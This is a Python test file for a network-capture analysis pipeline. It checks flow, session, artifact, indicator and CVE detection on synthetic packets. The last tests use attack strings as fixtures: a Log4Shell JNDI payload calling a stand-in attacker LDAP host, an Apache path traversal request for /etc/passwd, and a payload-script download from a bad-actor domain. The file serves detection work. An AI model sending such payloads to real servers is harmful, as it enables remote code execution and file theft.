"""Unit and integration tests for PCAP analysis pipeline (Milestone 1)."""

import gzip
import socket
import struct
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from uuid import uuid4

import pytest
from sqlalchemy import select

from core.config import settings
from core.database import get_sync_session
from core.storage import get_storage_backend
from models.investigation import AgentInvestigation
from models.investigation_evidence import InvestigationEvidence
from models.node import MonitoredNode
from models.pcap_analysis import (
    PcapAnalysisRuns,
    PcapArtifacts,
    PcapCveMatches,
    PcapFlows,
    PcapIocAllowlist,
    PcapIocs,
    PcapSeverityScores,
    TcpSessions,
)
from workers.pcap_pipeline import (
    _read_pure_python_packets,
    handle_chain_failure,
    normalize_flow_key,
    open_decompressed_pcap,
    pcap_analysis_extract_artifacts,
    pcap_analysis_extract_flows,
    pcap_analysis_extract_iocs,
    pcap_analysis_match_cve,
    pcap_analysis_reconstruct_sessions,
    pcap_analysis_score_severity,
    pcap_analysis_validate,
    start_pcap_analysis,
)


def build_synthetic_pcap_bytes(snaplen: int = 65535) -> bytes:
    """Construct a valid classic PCAP byte buffer with forward and reverse TCP packets and UDP."""
    # Global Header (24 bytes)
    magic = b"\xd4\xc3\xb2\xa1"  # Little-endian microseconds
    gh = magic + struct.pack("<HHiIII", 2, 4, 0, 0, snaplen, 1)  # Linktype 1 = Ethernet

    packets = []
    base_ts = 1700000000

    # 1. TCP SYN: 192.168.1.50:45000 -> 10.0.0.1:80
    eth = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb" + struct.pack("!H", 0x0800)
    ip1 = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, 101, 0x4000, 64, 6, 0,
        socket.inet_aton("192.168.1.50"), socket.inet_aton("10.0.0.1"),
    )
    tcp1 = struct.pack("!HHIIBBHHH", 45000, 80, 1000, 0, (5 << 4), 0x02, 65535, 0, 0)
    pkt1 = eth + ip1 + tcp1
    hdr1 = struct.pack("<IIII", base_ts, 100000, len(pkt1), len(pkt1))
    packets.append(hdr1 + pkt1)

    # 2. TCP SYN-ACK: 10.0.0.1:80 -> 192.168.1.50:45000 (Reverse)
    ip2 = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, 201, 0x4000, 64, 6, 0,
        socket.inet_aton("10.0.0.1"), socket.inet_aton("192.168.1.50"),
    )
    tcp2 = struct.pack("!HHIIBBHHH", 80, 45000, 5000, 1001, (5 << 4), 0x12, 65535, 0, 0)
    pkt2 = eth + ip2 + tcp2
    hdr2 = struct.pack("<IIII", base_ts + 1, 200000, len(pkt2), len(pkt2))
    packets.append(hdr2 + pkt2)

    # 3. TCP ACK: 192.168.1.50:45000 -> 10.0.0.1:80 (Forward)
    tcp3 = struct.pack("!HHIIBBHHH", 45000, 80, 1001, 5001, (5 << 4), 0x10, 65535, 0, 0)
    pkt3 = eth + ip1 + tcp3
    hdr3 = struct.pack("<IIII", base_ts + 2, 300000, len(pkt3), len(pkt3))
    packets.append(hdr3 + pkt3)

    # 4. UDP packet: 192.168.1.50:53000 -> 8.8.8.8:53 (DNS)
    ip4 = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 36, 301, 0, 64, 17, 0,
        socket.inet_aton("192.168.1.50"), socket.inet_aton("8.8.8.8"),
    )
    udp4 = struct.pack("!HHHH", 53000, 53, 16, 0) + b"DNS_TEST"
    pkt4 = eth + ip4 + udp4
    hdr4 = struct.pack("<IIII", base_ts + 3, 400000, len(pkt4), len(pkt4))
    packets.append(hdr4 + pkt4)

    return gh + b"".join(packets)


def test_flow_key_normalization():
    """Verify bidirectional normalization of 5-tuples."""
    k1, is_fwd1 = normalize_flow_key("192.168.1.50", "10.0.0.1", 45000, 80, "tcp")
    k2, is_fwd2 = normalize_flow_key("10.0.0.1", "192.168.1.50", 80, 45000, "tcp")
    assert k1 == k2
    assert is_fwd1 != is_fwd2


def test_pure_python_parser_extracts_packets(tmp_path):
    """Verify native PCAP reader extracts 5-tuple and flag metadata."""
    pcap_data = build_synthetic_pcap_bytes()
    pcap_file = tmp_path / "synthetic.pcap"
    pcap_file.write_bytes(pcap_data)

    packets = list(_read_pure_python_packets(pcap_file))
    assert len(packets) == 4

    p1, p2, p3, p4 = packets
    assert p1["protocol"] == "tcp"
    assert p1["src_ip"] == "192.168.1.50"
    assert p1["dst_ip"] == "10.0.0.1"
    assert p1["src_port"] == 45000
    assert p1["dst_port"] == 80
    assert p1["flags"]["SYN"] == 1
    assert p1["flags"]["ACK"] == 0

    assert p2["protocol"] == "tcp"
    assert p2["src_ip"] == "10.0.0.1"
    assert p2["dst_ip"] == "192.168.1.50"
    assert p2["flags"]["SYN"] == 1
    assert p2["flags"]["ACK"] == 1

    assert p4["protocol"] == "udp"
    assert p4["src_port"] == 53000
    assert p4["dst_port"] == 53


def test_open_decompressed_pcap_gzip(tmp_path):
    """Verify gzip compressed captures are decompressed via open_decompressed_pcap."""
    raw_bytes = build_synthetic_pcap_bytes()
    gz_file = tmp_path / "capture.pcap.gz"
    with gzip.open(gz_file, "wb") as gz_out:
        gz_out.write(raw_bytes)

    with open_decompressed_pcap(gz_file) as decompressed:
        assert decompressed.is_file()
        assert decompressed.read_bytes() == raw_bytes


def test_pcap_validation_valid(tmp_path, monkeypatch):
    """Validate a properly formatted PCAP evidence file."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    node_dir = tmp_path / "1" / "1"
    node_dir.mkdir(parents=True, exist_ok=True)
    pcap_path = node_dir / "evidence-1.pcap"
    pcap_path.write_bytes(build_synthetic_pcap_bytes(snaplen=2048))

    with get_sync_session() as session:
        # Create test node
        node = MonitoredNode(hostname="test-node-pipeline", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()

        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()

        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="evidence-1.pcap",
            storage_key="1/1/evidence-1.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()

        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="pending",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_validate(evidence_id=ev_id, run_id=run_id)
    assert res["status"] == "valid"
    assert res["packet_count"] == 4
    assert res["payload_available"] is True
    assert res["snaplen"] == 2048


def test_pcap_validation_corrupted_fails(tmp_path, monkeypatch):
    """Corrupted PCAP should fail validation and mark run as failed."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    corrupted = tmp_path / "corrupt.pcap"
    corrupted.write_bytes(b"invalid_pcap_content_shorter_than_24")

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-corrupt", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="corrupt.pcap",
            storage_key="corrupt.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="pending",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    with pytest.raises(Exception):
        pcap_analysis_validate(evidence_id=ev_id, run_id=run_id)

    with get_sync_session() as session:
        updated_run = session.execute(
            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
        ).scalar_one()
        assert updated_run.status == "failed"
        assert updated_run.error_step == "validate"


def test_flow_extraction_persists_flows(tmp_path, monkeypatch):
    """Extract flows from synthetic PCAP and verify bidirectional flow tracking."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    pcap_path = tmp_path / "flows.pcap"
    pcap_path.write_bytes(build_synthetic_pcap_bytes())

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-flows", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="flows.pcap",
            storage_key="flows.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="validate",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_flows(ev_id, run_id=run_id)
    assert res["status"] == "flows_extracted"
    assert res["flow_count"] == 2  # 1 TCP bidirectional flow + 1 UDP flow

    with get_sync_session() as session:
        flows = session.execute(
            select(PcapFlows).where(PcapFlows.run_id == run_id)
        ).scalars().all()
        assert len(flows) == 2

        tcp_flow = next(f for f in flows if f.protocol == "tcp")
        assert tcp_flow.bidirectional is True
        assert tcp_flow.packet_count + tcp_flow.reverse_packet_count == 3
        assert tcp_flow.flags["SYN"] == 2
        assert tcp_flow.flags["ACK"] == 2

        udp_flow = next(f for f in flows if f.protocol == "udp")
        assert udp_flow.bidirectional is False
        assert udp_flow.packet_count + udp_flow.reverse_packet_count == 1


def test_start_pcap_analysis_enqueues_chain(tmp_path, monkeypatch):
    """start_pcap_analysis creates a pending PcapAnalysisRuns record and returns run_id."""
    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-chain", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        inv_id = inv.id
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="chain.pcap",
            storage_key="chain.pcap",
            status="complete",
        )
        session.add(ev)
        session.commit()
        ev_id = ev.id

    result = start_pcap_analysis(ev_id)
    assert isinstance(result, dict)
    run_id = result["run_id"]
    assert isinstance(run_id, str)
    assert len(run_id) == 32
    assert result.get("reused") is False

    with get_sync_session() as session:
        run = session.execute(
            select(PcapAnalysisRuns).where(PcapAnalysisRuns.run_id == run_id)
        ).scalar_one()
        assert run.status == "pending"
        assert run.evidence_id == ev_id
        assert run.investigation_id == inv_id


def make_custom_pcap(packet_bytes_list: list[bytes], snaplen: int = 65535) -> bytes:
    """Build a PCAP with specified packets and snaplen."""
    magic = b"\xd4\xc3\xb2\xa1"
    gh = magic + struct.pack("<HHiIII", 2, 4, 0, 0, snaplen, 1)
    pkts = []
    base_ts = 1700000000
    for idx, raw_pkt in enumerate(packet_bytes_list):
        cap_len = min(len(raw_pkt), snaplen)
        hdr = struct.pack("<IIII", base_ts + idx, idx * 1000, cap_len, len(raw_pkt))
        pkts.append(hdr + raw_pkt[:cap_len])
    return gh + b"".join(pkts)


def build_custom_tcp_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    seq: int,
    ack: int,
    flags: int,
    payload: bytes = b"",
    win: int = 65535,
) -> bytes:
    """Construct an IPv4 TCP frame with specified 5-tuple, sequence, flags, and payload."""
    eth = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40 + len(payload), 101, 0x4000, 64, 6, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    data_offset_flags = (5 << 12) | flags
    tcp = struct.pack("!HHIIHH", src_port, dst_port, seq, ack, data_offset_flags, win) + b"\x00\x00\x00\x00"
    return eth + ip + tcp + payload


def build_custom_udp_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    payload: bytes = b"",
) -> bytes:
    """Construct an IPv4 UDP frame."""
    eth = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 28 + len(payload), 101, 0, 64, 17, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    udp = struct.pack("!HHHH", src_port, dst_port, 8 + len(payload), 0)
    return eth + ip + udp + payload


def test_tcp_session_reconstruction(tmp_path, monkeypatch):
    """Verify TCP 3-way handshake and session reconstruction."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    pkts = [
        # 1. SYN
        build_custom_tcp_packet("192.168.1.100", "10.0.0.1", 45100, 80, seq=1000, ack=0, flags=0x02, win=64240),
        # 2. SYN-ACK
        build_custom_tcp_packet("10.0.0.1", "192.168.1.100", 80, 45100, seq=5000, ack=1001, flags=0x12, win=65535),
        # 3. ACK
        build_custom_tcp_packet("192.168.1.100", "10.0.0.1", 45100, 80, seq=1001, ack=5001, flags=0x10, win=64240),
        # 4. Data
        build_custom_tcp_packet("192.168.1.100", "10.0.0.1", 45100, 80, seq=1001, ack=5001, flags=0x18, payload=b"HELLO_SERVER", win=64240),
    ]
    pcap_data = make_custom_pcap(pkts)
    pcap_path = tmp_path / "sessions.pcap"
    pcap_path.write_bytes(pcap_data)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-sess", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="sessions.pcap",
            storage_key="sessions.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_flows",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_reconstruct_sessions(ev_id, run_id=run_id)
    assert res["status"] == "sessions_reconstructed"
    assert res["session_count"] == 1

    with get_sync_session() as session:
        sess = session.execute(
            select(TcpSessions).where(TcpSessions.run_id == run_id)
        ).scalar_one()
        assert sess.client_isn == 1000
        assert sess.server_isn == 5000
        assert sess.client_win_size == 64240
        assert sess.server_win_size == 65535
        assert sess.state == "established"
        assert sess.reassembled_bytes == 12
        assert sess.confidence == "high"
        assert sess.payload_truncated is False


def test_artifact_extraction_http(tmp_path, monkeypatch):
    """Extract HTTP request and response artifacts and store payload bodies."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    req_body = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
    resp_body = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 17\r\n\r\n<h1>Palantir</h1>"
    pkts = [
        build_custom_tcp_packet("192.168.1.100", "10.0.0.1", 45200, 80, seq=1000, ack=5000, flags=0x18, payload=req_body),
        build_custom_tcp_packet("10.0.0.1", "192.168.1.100", 80, 45200, seq=5000, ack=1000 + len(req_body), flags=0x18, payload=resp_body),
    ]
    pcap_data = make_custom_pcap(pkts)
    pcap_path = tmp_path / "http.pcap"
    pcap_path.write_bytes(pcap_data)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-http", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="http.pcap",
            storage_key="http.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="reconstruct_sessions",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_artifacts(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["artifact_count"] >= 2

    with get_sync_session() as session:
        arts = session.execute(
            select(PcapArtifacts).where(PcapArtifacts.run_id == run_id)
        ).scalars().all()
        req_art = next(a for a in arts if a.artifact_type == "http_request")
        assert req_art.metadata_json["uri"] == "/index.html"
        assert req_art.metadata_json["method"] == "GET"

        resp_art = next(a for a in arts if a.artifact_type == "http_response")
        assert resp_art.metadata_json["status_code"] == 200
        assert resp_art.content_type == "text/html"
        assert resp_art.storage_key is not None
        storage = get_storage_backend()
        stored_bytes = storage.get_artifact(resp_art.storage_key)
        assert stored_bytes == b"<h1>Palantir</h1>"


def test_artifact_extraction_dns(tmp_path, monkeypatch):
    """Extract DNS query artifacts from UDP port 53 packets."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    dns_query = (
        struct.pack("!HHHHHH", 0xABCD, 0x0100, 1, 0, 0, 0)
        + b"\x07example\x03com\x00"
        + struct.pack("!HH", 1, 1)
    )
    pkt = build_custom_udp_packet("192.168.1.100", "8.8.8.8", 53100, 53, payload=dns_query)
    pcap_data = make_custom_pcap([pkt])
    pcap_path = tmp_path / "dns.pcap"
    pcap_path.write_bytes(pcap_data)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-dns", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="dns.pcap",
            storage_key="dns.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="reconstruct_sessions",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_artifacts(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["artifact_count"] == 1

    with get_sync_session() as session:
        art = session.execute(
            select(PcapArtifacts).where(PcapArtifacts.run_id == run_id)
        ).scalar_one()
        assert art.artifact_type == "dns_query"
        assert art.metadata_json["query_name"] == "example.com"


def test_artifact_extraction_tls(tmp_path, monkeypatch):
    """Extract TLS ClientHello SNI and JA3 hash fingerprints."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    sni_host = b"secure.corp.local"
    sni_ext = struct.pack("!HHHB", 0, len(sni_host) + 5, len(sni_host) + 3, 0) + struct.pack("!H", len(sni_host)) + sni_host
    exts_data = sni_ext
    ciphers = struct.pack("!HHH", 4, 0x002f, 0x0035)
    handshake = (
        struct.pack("!B", 1) + b"\x00"
        + struct.pack("!H", 38 + len(ciphers) + len(exts_data))
        + struct.pack("!H", 0x0303)
        + (b"\x02" * 32)
        + b"\x00"
        + ciphers
        + b"\x01\x00"
        + struct.pack("!H", len(exts_data))
        + exts_data
    )
    record = b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake
    pkt = build_custom_tcp_packet("192.168.1.100", "10.0.0.1", 45300, 443, seq=1000, ack=0, flags=0x18, payload=record)
    pcap_data = make_custom_pcap([pkt])
    pcap_path = tmp_path / "tls.pcap"
    pcap_path.write_bytes(pcap_data)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-tls", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="tls.pcap",
            storage_key="tls.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="reconstruct_sessions",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_artifacts(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["artifact_count"] >= 2

    with get_sync_session() as session:
        arts = session.execute(
            select(PcapArtifacts).where(PcapArtifacts.run_id == run_id)
        ).scalars().all()
        hello_art = next(a for a in arts if a.artifact_type == "tls_client_hello")
        assert hello_art.metadata_json["sni"] == "secure.corp.local"
        assert hello_art.metadata_json["ja3_hash"] is not None

        ja3_art = next(a for a in arts if a.artifact_type == "tls_ja3")
        assert ja3_art.metadata_json["ja3_hash"] == hello_art.metadata_json["ja3_hash"]


def test_snaplen_truncation_confidence(tmp_path, monkeypatch):
    """Verify snaplen <= 128 results in low confidence and truncated flag."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    pkt = build_custom_tcp_packet(
        "192.168.1.100", "10.0.0.1", 45400, 80, seq=1000, ack=0, flags=0x02, win=64240
    )
    pcap_data = make_custom_pcap([pkt], snaplen=128)
    pcap_path = tmp_path / "truncated.pcap"
    pcap_path.write_bytes(pcap_data)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-trunc", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="truncated.pcap",
            storage_key="truncated.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_flows",
        )
        session.add(run)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_reconstruct_sessions(ev_id, run_id=run_id)
    assert res["status"] == "sessions_reconstructed"

    with get_sync_session() as session:
        sess = session.execute(
            select(TcpSessions).where(TcpSessions.run_id == run_id)
        ).scalar_one()
        assert sess.snaplen == 128
        assert sess.payload_truncated is True
        assert sess.confidence == "low"


def test_ioc_extraction_flows_and_artifacts(tmp_path, monkeypatch):
    """Verify IOC extraction correctly identifies public IPs, private IPs, suspicious ports, and domains."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-iocs", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="iocs.pcap",
            storage_key="iocs.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_artifacts",
        )
        session.add(run)
        session.flush()

        # Add flows: 1 RFC1918 IP, 1 Public IP, 1 Suspicious Port (4444)
        fl1 = PcapFlows(
            run_id=run_id,
            evidence_id=ev.id,
            src_ip="192.168.1.100",
            dst_ip="93.184.216.34",  # example.com public IP
            src_port=54321,
            dst_port=4444,  # Suspicious Metasploit/reverse shell port
            protocol="tcp",
            flow_key="tcp:192.168.1.100:54321-93.184.216.34:4444",
            packet_count=10,
            byte_count=1200,
            first_seen=datetime.now(timezone.utc),
            last_seen=datetime.now(timezone.utc),
            bidirectional=True,
        )
        session.add(fl1)

        # Add artifacts: DNS query for malicious domain, TLS SNI for *.internal domain
        art_dns = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="dns_query",
            metadata_json={"query_name": "malicious-c2.cc", "is_response": False},
            size_bytes=40,
        )
        art_tls = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="tls_client_hello",
            metadata_json={"sni": "gateway.internal", "ja3_hash": "b32309a26ce516158d71234bcabcde12"},
            size_bytes=100,
        )
        art_http = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="http_request",
            metadata_json={"headers": {"host": "bad-actor.net"}, "uri": "/payload.sh", "method": "GET"},
            size_bytes=80,
        )
        session.add_all([art_dns, art_tls, art_http])
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_iocs(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["ioc_count"] >= 6
    assert res["public_ip_count"] >= 1

    with get_sync_session() as session:
        iocs = session.execute(
            select(PcapIocs).where(PcapIocs.run_id == run_id)
        ).scalars().all()

        ioc_dict = {(i.ioc_type, i.ioc_value): i for i in iocs}

        # 1. 192.168.1.100 is allowlisted RFC 1918
        assert ("ipv4", "192.168.1.100") in ioc_dict
        assert ioc_dict[("ipv4", "192.168.1.100")].is_allowlisted is True

        # 2. 93.184.216.34 is public IP (not allowlisted)
        assert ("ipv4", "93.184.216.34") in ioc_dict
        assert ioc_dict[("ipv4", "93.184.216.34")].is_allowlisted is False

        # 3. Port 4444 is flagged as suspicious port IOC
        assert ("port", "4444") in ioc_dict
        assert ioc_dict[("port", "4444")].is_allowlisted is False

        # 4. gateway.internal matches *.internal allowlist
        assert ("domain", "gateway.internal") in ioc_dict
        assert ioc_dict[("domain", "gateway.internal")].is_allowlisted is True

        # 5. malicious-c2.cc is domain IOC (not allowlisted)
        assert ("domain", "malicious-c2.cc") in ioc_dict
        assert ioc_dict[("domain", "malicious-c2.cc")].is_allowlisted is False

        # 6. bad-actor.net is domain IOC from HTTP host header
        assert ("domain", "bad-actor.net") in ioc_dict
        assert ioc_dict[("domain", "bad-actor.net")].is_allowlisted is False


def test_ioc_allowlist_custom_entry(tmp_path, monkeypatch):
    """Custom allowlist entry suppresses matching partner domain IOC."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)
    partner_id = uuid4().hex[:6]
    partner_domain = f"partner-{partner_id}.com"

    with get_sync_session() as session:
        # Add custom allowlist pattern
        custom_rule = PcapIocAllowlist(
            ioc_type="domain",
            pattern=f"*.{partner_domain}",
            description="Verified partner organization",
        )
        session.add(custom_rule)

        node = MonitoredNode(hostname="test-node-custom-allow", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="custom_allow.pcap",
            storage_key="custom_allow.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_artifacts",
        )
        session.add(run)
        session.flush()

        art = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="tls_client_hello",
            metadata_json={"sni": f"api.{partner_domain}"},
            size_bytes=80,
        )
        session.add(art)
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_extract_iocs(ev_id, run_id=run_id)
    assert res["status"] == "complete"

    with get_sync_session() as session:
        ioc = session.execute(
            select(PcapIocs).where(
                PcapIocs.run_id == run_id,
                PcapIocs.ioc_value == f"api.{partner_domain}",
            )
        ).scalar_one()
        assert ioc.is_allowlisted is True
        assert "Verified partner organization" in str(ioc.threat_intel_match)


def test_cve_matching_log4j_and_path_traversal(tmp_path, monkeypatch):
    """Scan HTTP artifacts for known Log4Shell and Apache path traversal signatures."""
    monkeypatch.setattr(settings, "PCAP_STORAGE_DIR", tmp_path)

    with get_sync_session() as session:
        node = MonitoredNode(hostname="test-node-cve", collector_url="http://127.0.0.1:20000", active=True)
        session.add(node)
        session.flush()
        inv = AgentInvestigation(node_id=node.id, trigger_type="manual", status="complete")
        session.add(inv)
        session.flush()
        ev = InvestigationEvidence(
            investigation_id=inv.id,
            node_id=node.id,
            evidence_type="pcap_collection",
            file_name="cve.pcap",
            storage_key="cve.pcap",
            status="complete",
        )
        session.add(ev)
        session.flush()
        run_id = uuid4().hex
        run = PcapAnalysisRuns(
            run_id=run_id,
            evidence_id=ev.id,
            investigation_id=inv.id,
            node_id=node.id,
            status="running",
            current_step="extract_iocs",
        )
        session.add(run)
        session.flush()

        # Artifact 1: Apache 2.4.49 path traversal attempt
        art1 = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="http_request",
            metadata_json={"uri": "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", "headers": {"host": "vulnerable-srv.org"}, "method": "GET"},
            size_bytes=90,
        )
        # Artifact 2: Log4Shell injection header
        art2 = PcapArtifacts(
            run_id=run_id,
            evidence_id=ev.id,
            artifact_type="http_request",
            metadata_json={"uri": "/login", "headers": {"user-agent": "${jndi:ldap://c2.attacker.net:1389/Exploit}"}, "method": "POST"},
            size_bytes=120,
        )
        session.add_all([art1, art2])
        session.commit()
        ev_id = ev.id

    res = pcap_analysis_match_cve(ev_id, run_id=run_id)
    assert res["status"] == "complete"
    assert res["cve_match_count"] >= 2

    with get_sync_session() as session:
        cves = session.execute(
            select(PcapCveMatches).where(PcapCveMatches.run_id == run_id)
        ).scalars().all()

        cve_map = {c.cve_id: c for c in cves}
        assert "CVE-2021-41773" in cve_map
        assert cve_map["CVE-2021-41773"].severity == "high"

        assert "CVE-2021-44228" in cve_map
        assert float(cve_map["CVE-2021-44228"].cvss_score) == 10.0
        assert cve_map["CVE-2021-44228"].severity == "critical"


